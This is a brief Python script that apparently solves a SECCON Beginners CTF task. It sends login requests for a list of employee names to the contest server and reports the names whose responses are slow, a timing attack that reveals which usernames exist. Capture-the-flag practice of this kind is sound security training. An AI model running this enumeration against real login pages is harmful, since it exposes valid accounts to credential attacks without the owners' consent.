#!/usr/bin/env python
import requests
import time

for employee in open('./employees.txt').read().split('\n'):
    start = time.time()
    r = requests.post('https://spy.quals.beginners.seccon.jp/', data = {'name': employee, 'password': 'a'})
    if time.time() - start > 0.3:
        print employee
